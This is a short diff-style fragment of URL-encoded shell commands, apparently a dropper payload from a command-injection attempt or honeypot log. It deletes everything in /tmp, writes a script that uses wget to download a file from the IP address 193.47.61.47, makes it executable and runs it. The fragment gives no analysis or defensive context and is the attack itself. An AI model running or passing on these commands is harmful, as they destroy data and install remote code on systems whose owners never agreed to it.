@@ -1,0 +1,6 @@
+rm+-rf+/tmp/*
+echo+-e+"cd+/tmp"+>+/tmp/s
+echo+-e+"wget+http:/\/193.47.61.47/g"+>>+/tmp/s
+echo+-e+"chmod+777+/tmp/g"+>>+/tmp/s
+echo+-e+"sh+/tmp/g"+>>+/tmp/s
+sh+/tmp/s
